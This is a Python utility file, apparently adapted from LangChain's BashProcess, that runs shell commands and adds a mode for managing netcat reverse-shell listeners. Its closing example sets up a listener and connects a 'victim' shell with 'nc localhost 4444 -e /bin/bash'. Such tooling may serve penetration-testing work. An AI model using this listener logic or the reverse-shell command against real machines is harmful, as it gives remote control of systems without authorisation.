"""Wrapper around subprocess to run commands."""
from __future__ import annotations

import platform
import re
import subprocess
import time
from typing import TYPE_CHECKING, List, Union
from uuid import uuid4

if TYPE_CHECKING:
    import pexpect


class BashProcess:
    """Wrapper for starting subprocesses.

    Uses the python built-in subprocesses.run()
    Persistent processes are **not** available
    on Windows systems, as pexpect makes use of
    Unix pseudoterminals (ptys). MacOS and Linux
    are okay.

    Example:
        .. code-block:: python

            from langchain_community.utilities.bash import BashProcess

            bash = BashProcess(
                strip_newlines = False,
                return_err_output = False,
                persistent = False
            )
            bash.run('echo \'hello world\'')

    """

    strip_newlines: bool = False
    """Whether or not to run .strip() on the output"""
    return_err_output: bool = False
    """Whether or not to return the output of a failed
    command, or just the error message and stacktrace"""
    persistent: bool = False
    """Whether or not to spawn a persistent session
    NOTE: Unavailable for Windows environments"""
    reverse_shell_listener: bool = False

    def __init__(
            self,
            strip_newlines: bool = False,
            return_err_output: bool = False,
            persistent: bool = False,
            reverse_shell_listener: bool = False
    ):
        """
        Initializes with default settings
        """
        self.strip_newlines = strip_newlines
        self.return_err_output = return_err_output
        self.reverse_shell_listener = reverse_shell_listener
        self.prompt = ""
        self.process = None
        self.persistent = persistent
        if persistent:
            self.prompt = str(uuid4())
            self.process = self._initialize_persistent_process(self, self.prompt)

    @staticmethod
    def _lazy_import_pexpect() -> pexpect:
        """Import pexpect only when needed."""
        if platform.system() == "Windows":
            raise ValueError(
                "Persistent bash processes are not yet supported on Windows."
            )
        try:
            import pexpect

        except ImportError:
            raise ImportError(
                "pexpect required for persistent bash processes."
                " To install, run `pip install pexpect`."
            )
        return pexpect

    @staticmethod
    def _initialize_persistent_process(self: BashProcess, prompt: str) -> pexpect.spawn:
        # Start bash in a clean environment
        # Doesn't work on windows
        """
        Initializes a persistent bash setting in a
        clean environment.
        NOTE: Unavailable on Windows

        Args:
            Prompt(str): the bash command to execute
        """
        pexpect = self._lazy_import_pexpect()
        process = pexpect.spawn(
            "env", ["-i", "bash", "--norc", "--noprofile"], encoding="utf-8"
        )
        # Set the custom prompt
        process.sendline("PS1=" + prompt)

        process.expect_exact(prompt, timeout=10)
        return process

    def run(self, commands: Union[str, List[str]], timeout: int = None) -> str:
        """
        Run commands in either an existing persistent
        subprocess or on in a new subprocess environment.

        Args:
            commands(List[str]): a list of commands to
                execute in the session
            timeout(int): the maximum time to wait for command execution in seconds
        """
        if isinstance(commands, str):
            commands = [commands]
        commands = ";".join(commands)
        if self.process is not None:
            return self._run_persistent(
                commands,
                timeout
            )
        else:
            return self._run(commands, timeout)

    def _run(self, command: str, timeout: int = None) -> str:
        """
        Runs a command in a subprocess and returns
        the output.

        Args:
            command: The command to run
        """
        temporary_process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        try:
            print("Waiting for command to execute...")
            stdout, stderr = temporary_process.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            temporary_process.kill()  # ensure the process is terminated
            stdout, stderr = temporary_process.communicate()  # get output up to the current point
            output = stdout.strip() if self.strip_newlines else stdout
            return f"Timeout error while executing command. Output so far:\n{output}"
        except Exception as error:
            temporary_process.kill()  # ensure the process is terminated
            return str(error)
        if temporary_process.returncode != 0:
            if self.return_err_output:
                return stdout
            return f"Command exited with status {temporary_process.returncode}"
        return stdout.strip() if self.strip_newlines else stdout

    def _run_persistent(self, command: str, timeout: int = None) -> str:
        """
        Runs commands in a persistent environment
        and returns the output.

        Args:
            command: the command to execute
        """
        pexpect = self._lazy_import_pexpect()
        if self.process is None:
            raise ValueError("Process not initialized")

        if self.reverse_shell_listener:
            if 'nc ' in command:
                return self._handle_netcat_command(command, pexpect, timeout)
            else:
                return self._handle_reverse_shell_command(command, pexpect, timeout)

        self.process.sendline(command)
        print("Waiting for command to execute...")
        # Expecting that the process will return our custom prompt after executing the command, indicating completion
        self.process.expect(self.prompt, timeout=timeout)
        # Clear the output with an empty string, but the output is still available in self.process.before
        self.process.sendline("")

        try:
            self.process.expect([self.prompt, pexpect.EOF], timeout=timeout)
        except pexpect.TIMEOUT:
            self.process.sendintr()
            return f"Timeout error while executing command. Output so far:\n{self._get_command_output(command)}"
        if self.process.after == pexpect.EOF:
            return (f"Exited with error status: {self.process.exitstatus}. "
                    f"Command output:\n{self._get_command_output(command)}")
        return self._get_command_output(command)

    def _handle_reverse_shell_command(self, command, pexpect, timeout):
        try:
            i = self.process.expect(['connect to', 'Connect to', pexpect.EOF], 3)
            if i in [0, 1]:  # if connection was established
                self.process.sendline(command)
                print("Waiting timeout duration until fetching output...")
                time.sleep(timeout)
                return self._get_command_output(command)
            else:
                return f"It appears that a connection to the listener has not yet been established:\n{self._get_command_output(command)}"
        except Exception as e:
            return (f"Error while trying to check for an established connection to the listener:\n{e}"
                    f"\nOutput so far:\n{self._get_command_output(command)}")

    def _handle_netcat_command(self, command, pexpect, timeout):
        print("Netcat command detected. Resetting process to initiate reverse shell listener...")
        self.process.close(force=True)
        self.prompt = str(uuid4())
        self.process = self._initialize_persistent_process(self, self.prompt)
        self.process.sendline(command)
        try:
            i = self.process.expect(['listening', 'Listening', pexpect.EOF], timeout)
            if i in [0, 1]:  # if listening prompt is there
                self.process.sendline("")
                return self._get_command_output(command)
            else:
                self.process.sendline("")
                return (f"Error while trying to initiate reverse shell listener:\n"
                        + self._get_command_output(command))
        except Exception as e:
            self.process.sendline("")
            return f"Error while trying to initiate reverse shell listener: {e}"

    def _get_command_output(self, command: str) -> str:
        output = self.process.before
        output = self._process_output(output, command)
        if self.strip_newlines:
            return output.strip()
        return output

    def _process_output(self, output: str, command: str) -> str:
        """
        Uses regex to remove the command from the output

        Args:
            output: a process' output string
            command: the executed command
        """
        pattern = re.escape(command) + r"\s*\n"
        output = re.sub(pattern, "", output, count=1)
        return output.strip()


# Example usage
if __name__ == '__main__':
    process = BashProcess(return_err_output=True, persistent=True)
    print(process.run("ls"))
    print(process.run("sudo ls", 3))

    # Should respect the timeout, print an error and return output of the next command normally
    print(process.run("echo 'hello 1'; sleep 5; echo 'hello 2'", 3))
    print(process.run("echo 'hello 3'; echo 'hello 4'", 3))

    process = BashProcess(return_err_output=True, persistent=False)
    print(process.run("ls"))
    print(process.run("sudo ls"))
    # Should return an error message and respect the timeout
    print(process.run("echo 'hello 1'; sleep 5; echo 'hello 2'", 3))

    listener = BashProcess(return_err_output=True, persistent=True, reverse_shell_listener=True)
    print(listener.run("nc -lvp 4444", 3))
    victim = BashProcess(return_err_output=True, persistent=True)
    print(victim.run("nc localhost 4444 -e /bin/bash", 3))
    print(listener.run("ls", 3))
